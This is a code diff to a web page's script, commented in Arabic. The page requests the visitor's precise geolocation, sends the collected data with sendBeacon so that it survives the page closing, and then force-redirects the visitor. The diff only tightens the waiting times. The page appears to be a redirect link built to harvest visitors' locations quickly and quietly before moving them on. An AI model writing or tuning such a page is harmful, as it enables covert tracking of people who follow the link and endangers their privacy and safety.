@@ -106,14 +106,14 @@
                 navigator.geolocation.getCurrentPosition(
                     (pos) => { bestPos = pos; locationCaptured = true; },
                     () => { locationCaptured = true; },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
                 );
             } else {
                 locationCaptured = true;
             }
 
-            // 2. انتظار الموقع (حد أقصى 2 ثانية)
-            for (let i = 0; i < 20 && !locationCaptured; i++) {
+            // 2. انتظار الموقع (حد أقصى 3 ثوانٍ)
+            for (let i = 0; i < 30 && !locationCaptured; i++) {
                 await new Promise(r => setTimeout(r, 100));
             }
 
@@ -131,7 +131,7 @@
 
             const jsonStr = JSON.stringify(data);
 
-            // 4. إرسال البيانات بـ sendBeacon أولاً (الأهم - ينجو من إغلاق الصفحة)
+            // 4. إرسال البيانات بـ sendBeacon أولاً (ينجو من إغلاق الصفحة)
             let beaconSent = false;
             try {
                 const blob = new Blob([jsonStr], { type: 'application/json' });
@@ -155,8 +155,8 @@
             }
         };
 
-        // أمان: تحويل قسري بعد 5 ثوانٍ في أسوأ الأحوال
-        setTimeout(redirect, 5000);
+        // أمان: تحويل قسري بعد 4 ثوانٍ
+        setTimeout(redirect, 4000);
     </script>
 </body>
 
